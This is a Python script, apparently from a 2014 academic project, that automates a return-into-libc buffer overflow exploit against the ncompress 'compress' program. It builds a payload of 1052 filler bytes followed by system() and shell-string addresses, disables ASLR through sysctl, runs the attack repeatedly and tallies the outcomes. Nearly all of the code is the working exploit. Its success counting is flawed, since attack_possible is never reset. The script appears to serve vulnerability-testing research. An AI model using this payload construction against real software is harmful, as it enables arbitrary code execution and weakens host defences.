#!/usr/bin/python
# Developed by: Denis Ulybyshev and Servio Palacios 
# This tool will help to test vulnerabilities 
# First draft: 2014-10-22
# Edited: 2014.11.02
# Crafting exploit with ncompress

import os
import sys

#Pointer used
codePointer = ["return", "baseptr"] ;

funcs = ["memcpy", "strcpy", "strncpy", "sprintf","strcat"];

#We just handle Stack or Buffer Overflows
locations = ["stack","heap",];
attacks = ["segmentationfault", "returnintolibc", "outputfile"];

techniques = []
app_name = []
repeat_times = 0
aslr_on = 0

#Checking Arguments
if len(sys.argv) < 3:
	print "Usage: sudo "+ sys.argv[0] + " [app name] [# repeats] [ASLR ON=1|OFF=0]"
	sys.exit(1)

else:
        app_name = [sys.argv[1]]
	repeat_times = int(sys.argv[2])
        if sys.argv[3] == "1":
                aslr_on = 1


#if Directory of our Benchmarking tool does not exists, create it
i = 0
if not os.path.exists("./" + app_name[0]):
        print "Directory [{}] does not exist. Aborting...\n".format(app_name[0])
        sys.exit()
else:
        #We need a directory to store our results, all logs will be there
        if not os.path.exists("./" + app_name[0] + "/bench-eval"):
                os.system("mkdir " + app_name[0] + "/bench-eval");

#Turning ASLR OFF or ON, according to input parameter
if aslr_on == 0:
        os.system('sysctl -w kernel.randomize_va_space=0')
else:
        os.system('sysctl -w kernel.randomize_va_space=1')

print "Bench_eval v.0.0.1 Testing [{}] repeating [{}] times and aslr {}\n".format(app_name[0], repeat_times, aslr_on)

total_ok=0;
total_fail=0;
total_some=0;
total_np = 0;
i = 0
s_attempts = 0
attack_possible = 1
root_directory = "./" + app_name[0] + "/"
source_directory = root_directory + "src/"
bench_eval_directory = root_directory + "bench-eval/"

#Reading addresses file, this should be generated from buggy app
f = open(source_directory + "addresses.txt",'r')
addresses = f.read().splitlines() # will append in the list out
system_address="" 
shell_address=""
fake_address="\\xee\\xff\\xc0\\x10"
int_shell_address=0

#Crafting Addresses that will be used in exploit
for address in addresses:
        if len(address)==10:
                system_address =  "\\x" + address[8:10] + "\\x" + address[6:8] + "\\x" + address[4:6] + "\\x" + address[2:4]
                print "system address: " + system_address
        else:
                shell_address = "\\x" + address[7:9] + "\\x" +  address[5:7] + "\\x" +  address[3:5] + "\\x0" + address[2:3]
                print "shell address: " + shell_address

while i < repeat_times:
        i += 1

        #os.system("rm " + bench_eval_directory + "bench_log")
        cmdline = source_directory + "compress `perl -e 'print \"A\"x1052 . " + "\"" + system_address + "\"" + \
        " . " + "\"" + fake_address + " . " + "\"" + " . " + "\"" + shell_address + "\"" + ";'`" + " > " + bench_eval_directory + "bench_log 2>&1 &"
        print cmdline
        
        os.system(cmdline)
        log_file = bench_eval_directory + "bench_log"
        log = open("/home/cs590/Desktop/repos/CS590Project/bench_tool/ncompress/bench-eval/bench_log","r")

        if log.read().find("File name too long") != -1:
                print "POSSIBLE"
                attack_possible = 1;
                #break;	

        if log.read().find("Segmentation fault") != -1:
                print "Segmentation Fault"
                attack_possible = 1;
                #break;	
        
        s_attempts += 1

        if attack_possible == 0:
                total_np += 1;
                continue
        else:
                total_ok = total_ok + 1                 						

total_attacks = total_ok + total_some + total_fail + total_np;
print "\n||Summary|| OK: ",total_ok," ,SOME: ",total_some," ,FAIL: ",total_fail," ,NP: ",total_np," ,Total Attacks: ",total_attacks

						
					



